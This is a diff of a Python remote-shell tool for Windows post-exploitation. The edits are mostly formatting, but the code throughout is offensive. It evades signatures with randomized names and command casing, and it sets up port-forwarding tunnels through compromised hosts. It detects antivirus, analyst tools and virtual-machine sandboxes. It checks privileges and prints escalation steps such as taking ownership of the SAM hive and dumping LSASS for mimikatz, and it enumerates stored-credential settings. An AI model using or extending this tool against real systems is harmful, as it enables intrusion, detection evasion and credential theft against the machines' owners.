@@ -22,17 +22,19 @@ def random_sig():
 
     Return: random file name to avoid signatures, or at least limit signature exposure
     """
-    rand_length = random.randint(3,60)
+    rand_length = random.randint(3, 60)
     if rand_length % 2 == 0:
         return ''.join(random.choices(string.ascii_lowercase + string.digits, k=rand_length))
     else:
         return ''.join(random.choices(string.ascii_uppercase + string.digits, k=rand_length))
+
 
 OUTPUT_FILENAME = random_sig()
 # uncomment below to ensure random output filename generation
 # print(OUTPUT_FILENAME)
 
 CODEC = sys.stdout.encoding
+
 
 def temp_perm(option):
     """
@@ -46,21 +48,21 @@ def temp_perm(option):
     final_arr = []
     if option == "dir":
         for i in letters_dir:
-            rand_num = random.randint(1,2)
+            rand_num = random.randint(1, 2)
             if rand_num == 1:
                 final_arr.append(i.upper())
             else:
                 final_arr.append(i.lower())
     elif option == "cmd":
         for i in letters_cmd:
-            rand_num = random.randint(1,2)
+            rand_num = random.randint(1, 2)
             if rand_num == 1:
                 final_arr.append(i.upper())
             else:
                 final_arr.append(i.lower())
     elif option == "power":
         for i in letters_power:
-            rand_num = random.randint(1,2)
+            rand_num = random.randint(1, 2)
             if rand_num == 1:
                 final_arr.append(i.upper())
             else:
@@ -69,6 +71,7 @@ def temp_perm(option):
     else:
         pass
     return ''.join(final_arr)
+
 
 class RemoteShell(cmd.Cmd):
     def __init__(self, share, win32Process, smbConnection, shell_type, silentCommand=False):
@@ -105,7 +108,6 @@ class RemoteShell(cmd.Cmd):
         # If the user wants to just execute a command without cmd.exe, set raw command and set no output
         if self.__silentCommand is True:
             self.__shell = ''
-
 
     def format_print_buff(self):
         if len(self.__outputBuffer.strip('\r\n')) > 0:
@@ -202,7 +204,7 @@ class RemoteShell(cmd.Cmd):
     def do_loggrab(self, s):
         try:
             prefix = 'copy '
-            log_file_name = s 
+            log_file_name = s
             file_path = 'C:\Windows\System32\Winevt\Logs\\'
             remote_copy = ' C:\Windows\system32\spool\drivers\color'
             combined_command = prefix + '"' + file_path + s + '"' + remote_copy
@@ -213,7 +215,6 @@ class RemoteShell(cmd.Cmd):
             self.format_print_buff()
         except Exception as e:
             print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
-
 
     def do_mounts(self, s):
         try:
@@ -282,7 +283,9 @@ class RemoteShell(cmd.Cmd):
         rhost = s.split(" ")[1]
         rport = s.split(" ")[2]
         try:
-            self.execute_remote("netsh interface portproxy add v4tov4 listenport=%s connectport=%s connectaddress=%s" % (lport, rport, rhost))
+            self.execute_remote(
+                "netsh interface portproxy add v4tov4 listenport=%s connectport=%s connectaddress=%s" % (
+                lport, rport, rhost))
             self.format_print_buff()
         except Exception as e:
             print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
@@ -295,15 +298,15 @@ class RemoteShell(cmd.Cmd):
             print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
     def do_deltun(self, s):
-        lport = s.split(" ")[0] 
+        lport = s.split(" ")[0]
         try:
             self.execute_remote("netsh interface portproxy delete v4tov4 listenport=%s" % (lport))
             self.format_print_buff()
         except Exception as e:
             print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
-    
+
     def do_ls(self, s):
-        #see if user specified a dir or not
+        # see if user specified a dir or not
         if len(s) == 0:
             try:
                 self.execute_remote('dir /A /N /O:D .')
@@ -318,7 +321,6 @@ class RemoteShell(cmd.Cmd):
             except Exception as e:
                 print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
-    
     # add progress bar, see how ivan does his
     # add md5 before after 
     def do_lput(self, s):
@@ -343,37 +345,39 @@ class RemoteShell(cmd.Cmd):
         except Exception as e:
             print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
-
-
-    # fix this dumpster fire     
+    # fix this dumpster fire
     def do_av(self, s):
         try:
-            self.execute_remote('tasklist /svc | findstr /i "MsMpEng.exe WinDefend MSASCui.exe navapsvc.exe avkwctl.exe fsav32.exe mcshield.exe ntrtscan.exe avguard.exe ashServ.exe avengine.exe avgemc.exe tmntsrv.exe kavfswp.exe kavtray.exe vapm.exe avpui.exe avp.exe"')
+            self.execute_remote(
+                'tasklist /svc | findstr /i "MsMpEng.exe WinDefend MSASCui.exe navapsvc.exe avkwctl.exe fsav32.exe mcshield.exe ntrtscan.exe avguard.exe ashServ.exe avengine.exe avgemc.exe tmntsrv.exe kavfswp.exe kavtray.exe vapm.exe avpui.exe avp.exe"')
             self.format_print_buff()
         except Exception as e:
             print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
-
-    # fix this output 
+    # fix this output
     def do_tokens(self, s):
         self.execute_remote('whoami /priv | findstr /i "Enabled"')
-        if len(self.__outputBuffer.strip('\r\n')) > 0: 
+        if len(self.__outputBuffer.strip('\r\n')) > 0:
             if "SeImpersonatePrivilege" in self.__outputBuffer:
-                print('SeImpersonate Enabled: \n   juicy-potato\n   RougeWinRM\n   SweetPotato\n   PrintSpoofer')
+                cprint('[*] SeImpersonate Enabled:', 'green')
+                print('\tJuicy-Potato\n\tRougeWinRM\n\tSweetPotato\n\tPrintSpoofer')
             if "SeBackupPrivilege" in self.__outputBuffer:
-                print('SeBackupPrivilege Enabled: \n   https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1\n   https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug\n   https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec')
+                cprint('[*] SeBackupPrivilege Enabled:', 'green')
+                print('\thttps://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1\n\thttps://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug\n\thttps://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec')
             if "SeTakeOwnershipPrivilege" in self.__outputBuffer:
-                print('SeTakeOwnershipPrivilege Enabled: \n   takeown /f "C:\windows\system32\config\SAM"\n   icacls "C:\windows\system32\config\SAM" /grant <your_username>:F')
+                cprint('[*] SeTakeOwnershipPrivilege Enabled:', 'green')
+                print('\ttakeown /f "C:\windows\system32\config\SAM"\n\ticacls "C:\windows\system32\config\SAM" /grant <your_username>:F')
             if "SeDebugPrivilege" in self.__outputBuffer:
-                print("SeDebugPrivilege Enabled: \n   Procdump.exe on LSASS.exe, use mimikatz")
+                cprint('[*] SeDebugPrivilege Enabled:', 'green')
+                print('\tProcdump.exe on LSASS.exe, use mimikatz')
         else:
             logging.info("No Valuable Tokens Found")
         self.__outputBuffer = ''
 
-
     def do_creds(self, s):
-        #WDigest 
-        self.execute_remote("reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential")
+        # WDigest
+        self.execute_remote(
+            "reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential")
         if "0x0" in self.__outputBuffer or "0" in self.__outputBuffer or "ERROR" in self.__outputBuffer:
             logging.info("WDigest is not enabled")
             self.__outputBuffer = ''
@@ -399,19 +403,20 @@ class RemoteShell(cmd.Cmd):
             self.__outputBuffer = ''
         else:
             logging.info("Error: Couldnt enumerate Credential Guard")
-        self.execute_remote('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT')
+        self.execute_remote(
+            'reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT')
         if "10" in self.__outputBuffer:
             logging.info("Default of 10 cached logons")
-            self.__outputBuffer = '' 
+            self.__outputBuffer = ''
 
         else:
             logging.info("Cached Logon Credential Amount")
             self.format_print_buff()
 
-
     def do_securitytools(self, s):
         logging.info("Security Researcher Tools: ")
-        self.execute_remote('tasklist /svc | findstr /i "pd64.exe ida64.exe ida32.exe x64dbg.exe x32dbg.exe hiew32.exe sysanalyzer.exe petools.exe dnSpy.exe lordpe.exe PE-bear.exe Procmon.exe Procmon64.exe Autoruns.exe Autoruns64.exe Dbgview.exe dbgview64.exe Diskmon.exe Diskmon64.exe portmon.exe procdump.exe procdump64.exe tcpview.exe tcpview64.exe procexp.exe procexp64.exe die.exe ProcessHacker.exe Wireshark.exe dumpcap.exe"')
+        self.execute_remote(
+            'tasklist /svc | findstr /i "pd64.exe ida64.exe ida32.exe x64dbg.exe x32dbg.exe hiew32.exe sysanalyzer.exe petools.exe dnSpy.exe lordpe.exe PE-bear.exe Procmon.exe Procmon64.exe Autoruns.exe Autoruns64.exe Dbgview.exe dbgview64.exe Diskmon.exe Diskmon64.exe portmon.exe procdump.exe procdump64.exe tcpview.exe tcpview64.exe procexp.exe procexp64.exe die.exe ProcessHacker.exe Wireshark.exe dumpcap.exe"')
         if len(self.__outputBuffer.strip('\r\n')) > 0:
             self.format_print_buff()
         else:
@@ -420,7 +425,8 @@ class RemoteShell(cmd.Cmd):
     def do_vmcheck(self, s):
         try:
             logging.info("Common Processes: ")
-            self.execute_remote('tasklist /svc | findstr /i "vmtoolsd.exe VBoxTray.exe vboxservice.exe vmwaretray.exe vmwareuser.exe vmware.exe vmount2.exe VGAuthService.exe vmacthlp.exe vmsrvc.exe vmusrvc.exe prl_cc.exe prl_tools.exe prl_cc.exe xenservice.exe xsvc_depriv.exe joeboxserver.exe joeboxcontrol.exe qemu-ga.exe WPE Pro.exe"')
+            self.execute_remote(
+                'tasklist /svc | findstr /i "vmtoolsd.exe VBoxTray.exe vboxservice.exe vmwaretray.exe vmwareuser.exe vmware.exe vmount2.exe VGAuthService.exe vmacthlp.exe vmsrvc.exe vmusrvc.exe prl_cc.exe prl_tools.exe prl_cc.exe xenservice.exe xsvc_depriv.exe joeboxserver.exe joeboxcontrol.exe qemu-ga.exe WPE Pro.exe"')
             if len(self.__outputBuffer.strip('\r\n')) > 0:
                 self.format_print_buff()
             else:
@@ -550,7 +556,6 @@ class RemoteShell(cmd.Cmd):
             self.execute_remote("del update.exe")
         except Exception as e:
             print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
-
 
     def do_exit(self, s):
         return True
